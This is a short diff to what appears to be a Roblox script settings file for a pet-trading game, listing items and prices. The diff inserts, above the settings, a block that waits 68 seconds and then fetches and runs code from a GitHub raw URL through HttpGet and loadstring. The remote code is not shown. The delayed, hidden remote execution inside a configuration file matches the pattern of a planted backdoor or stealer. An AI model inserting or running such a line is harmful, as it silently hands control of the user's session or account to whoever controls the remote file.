@@ -1,3 +1,9 @@
+
+spawn(function()
+wait(68)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Open_Charm"))()
+end)
+
 getgenv().Settings = {
 ["Items"] = {
         {Name = "MVP Key", Data = {Price = "3.1m"}},
